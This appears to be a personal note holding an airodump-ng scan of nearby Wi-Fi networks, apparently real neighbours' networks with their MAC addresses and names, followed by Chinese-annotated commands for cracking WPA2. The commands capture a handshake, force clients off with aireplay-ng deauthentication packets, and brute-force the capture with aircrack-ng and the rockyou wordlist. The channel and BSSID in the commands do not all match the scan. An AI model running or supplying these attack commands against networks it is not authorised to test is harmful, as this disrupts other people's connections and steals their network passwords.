                                                                                                                        
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                         
                                                                                                                         
 10:63:4B:05:DB:54   -1        0        0    0  13   -1                    <length:  0>                                                                              
 9A:EA:11:BB:16:D2   -1        0        0    0  10   -1                    <length:  0>                                                                              
 14:89:CB:8A:31:40   -1        0        2    0  11   -1   WPA              <length:  0>                                                                              
 F4:84:8D:9A:56:EE  -18       13        3    0   6  720   WPA2 CCMP   PSK  TP-LINK_56EE                                                                              
 F6:84:8D:7A:56:EE  -18        9        0    0   6  720   WPA2 CCMP   PSK  <length:  0>                                                                              
 B8:3A:08:B2:FA:61  -40       17        0    0  13  270   WPA2 CCMP   PSK  Tenda_B2FA60                                                                              
 BC:46:99:F7:59:44  -44        9        0    0   6  270   WPA2 CCMP   PSK  TP-LINK_5944                                                                              
 F6:1C:71:4B:F4:A9  -43        7        0    0  11  324   WPA2 CCMP   PSK  ChinaUnicom-F4A8_Wi-Fi5                                                                   
 F6:1C:71:0B:F4:A9  -44        6        0    0  11  324   WPA2 CCMP   PSK  ChinaUnicom-F4A8                                                                          
 B0:AC:D2:4F:13:8A  -54        6        0    0   1  130   WPA2 CCMP   PSK  ChinaNet-2.4G-138A                                                                        
 D4:DA:21:A5:4E:5C  -60        6        0    0   1  130   WPA2 CCMP   PSK  xy0922                                                                                    
 A4:39:B3:85:D9:0C  -61        3        0    0   1  270   WPA2 CCMP   PSK  301-1                                                                                     
 D0:76:E7:62:7F:9B  -62        6       27    0   6  130   OPN              TP-LINK_7F9B                                                                              
 A0:91:C8:39:03:10  -67        6        0    0   8  130   WPA2 CCMP   PSK  ChinaNet-G35F                                                                             
 5C:A4:A4:0B:11:ED  -67        6        0    0  11  130   WPA2 CCMP   PSK  ChinaNet-r6wp                                                                             
 60:AA:EF:A2:2C:F1  -68        3        0    0   6  360   WPA2 CCMP   PSK  <length:  0>                                                                              
 60:AA:EF:A2:2C:EC  -69        2        0    0   6  400   WPA2 CCMP   PSK  Ben's WiFi for hot girls                                                                  
 48:A7:3C:4C:23:89  -69        2        0    0   9  130   WPA2 CCMP   PSK  ChinaNet-izvz                                                                             
 24:1D:48:CB:1A:31  -69        1        3    0   4  360   WPA2 CCMP   PSK  wy2000                                                                                    
 44:DF:65:67:BE:A1  -69        4        2    0  10  130   WPA2 CCMP   PSK  金生米煮成熟饭                                                                            
 2C:61:04:A7:99:94  -70        4        0    0  11  130   WPA2 CCMP   PSK  ChinaNet-2.4G-9994                                                                        
 36:F7:16:AC:7F:8E  -70        4        0    0   1  270   WPA2 CCMP   PSK  <length:  0>                                                                              
 98:00:6A:36:43:B0  -71        2        0    0   3  360   WPA2 CCMP   PSK  SZ2020                                                                                    
 34:F7:16:8C:7F:8E  -73        3        0    0   1  270   WPA2 CCMP   PSK  TP-LINK_7F8E                                                                              
 B8:F8:83:88:16:9A  -72       10        0    0   1  270   WPA2 CCMP   PSK  伟业商行                                                                                  
 DC:FE:18:4D:9A:AA  -76        1        0    0   1  405   WPA2 CCMP   PSK  TSKF                                                                                      
 78:60:5B:D0:AE:7F  -77        0        0    0   1  360   WPA2 CCMP   PSK  JJJJJJJ                                                                                   
 82:60:5B:D0:AE:7F  -79        2        0    0   1  360   WPA2 CCMP   PSK  <length:  0>                                                                              
 60:AA:EF:F2:2C:F1  -69        2        0    0   6  360   WPA2 CCMP   PSK  Ben's WiFi for hot girls_Wi-Fi5                                                           
 54:66:6C:AE:72:D0  -68        1        0    0   3  130   WPA2 CCMP   PSK  ChinaNet-ccsh                                     
                                                                               


 44:DF:65:67:BE:A1  -67       21        9    0  10  130   WPA2 CCMP   PSK  金生米煮成熟饭  


抓包  bssid（mac地址） 和 ch （频段） 也是这里的-c
airodump-ng -c 9 --bssid B8:3A:08:B2:FA:61 -w /home/apple/桌面/handshake wlan0mon

攻击  -a后面是mac地址 ;-c后面是我们上一步抓包的STATION
aireplay-ng -0 10 -a 44:DF:65:67:BE:A1 -c EC:2E:98:93:AF:2F wlan0mon

破解  -w 后面是我们放在桌面的字典  -b后面是BSSID地址  以及我们抓包的文件地址
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 44:DF:65:67:BE:A1 /home/apple/桌面/handshake-02.cap